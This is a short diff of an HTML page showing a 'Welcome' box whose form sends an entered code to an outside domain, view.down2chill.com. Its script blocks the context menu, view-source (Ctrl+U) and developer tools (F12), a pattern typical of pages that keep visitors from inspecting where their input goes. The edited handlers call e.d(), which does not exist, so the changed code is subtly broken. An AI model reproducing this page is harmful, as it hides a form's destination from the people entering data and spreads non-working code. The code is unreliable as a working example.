@@ -11,17 +11,17 @@
     button{padding:0.75rem 1.5rem;font-size:1rem;border:none;border-radius:4px;background:#fff;color:#4F46E5;font-weight:bold;cursor:pointer}
   </style>
   <script>
-    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('contextmenu', e => e.d());
     document.addEventListener('keydown', e => {
-      if ((e.keyCode === 17) && (e.keyCode === 85)) e.preventDefault();
-      if (e.keyCode === 123) e.preventDefault();
+      if (e.ctrlKey && (e.keyCode === 85)) e.d();
+      if (e.keyCode === 123) e.d();
     });
   </script>
 </head>
 <body>
   <div class="box1">
     <h2>Welcome</h2>
-    <form id="loginForm" method="post" action="https://view.down2chill.com">
+    <form method="post" action="https://view.down2chill.com">
       <input type="text" name="code" placeholder="Enter Code" required>
       <br>
       <button type="submit">Submit</button>
